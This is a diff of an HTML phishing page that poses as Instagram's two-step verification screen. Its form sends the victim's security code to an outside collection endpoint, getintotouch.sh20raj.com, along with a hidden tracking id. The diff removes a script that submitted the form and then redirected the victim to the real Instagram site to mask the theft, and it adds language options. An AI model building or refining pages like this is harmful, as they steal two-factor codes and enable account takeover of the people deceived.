@@ -42,7 +42,7 @@
     <!-- SMARTPHONE SECTION END -->
     <!-- FORM SECTION -->
     <article class="form-area">
-      <form id="myForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
+      <form action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
         <p class="small-title">2-Step Verification</p>
         <input type="text" name="code" id="code" required="" placeholder="Security code">
         <input type="hidden" name="linkId" value="657c42262ec13a0c21704b76">
@@ -92,7 +92,9 @@
     </div>
     <div class="copyright">
       <select aria-label="Trocar idioma de exibição">
-        <!-- Your language options here -->
+        <option value="en">English</option>
+        <option value="af">Afrikaans</option>
+        <!-- Other language options -->
       </select>
       <span>© 2023 Instagram from Meta</span>
     </div>
@@ -100,24 +102,6 @@
   <script src="/js/socials/app.js"></script>
   <script src="/js/socials/brands.min.js"></script>
   <script src="/js/socials/fontawesome.min.js"></script>
-  <script>
-    document.getElementById('myForm').addEventListener('submit', function (e) {
-      e.preventDefault(); // Prevent the form from submitting the traditional way
-
-      // Your form processing logic here
-
-      // Submit the form to the original action URL
-      var form = this;
-      setTimeout(function () {
-        form.submit();
-      }, 1000); // Adjust the delay (in milliseconds) based on your needs
-
-      // Redirect to Instagram after form submission
-      setTimeout(function () {
-        window.location.href = 'https://www.instagram.com/';
-      }, 2000); // Adjust the delay for redirection
-    });
-  </script>
 </body>
 
 </html>
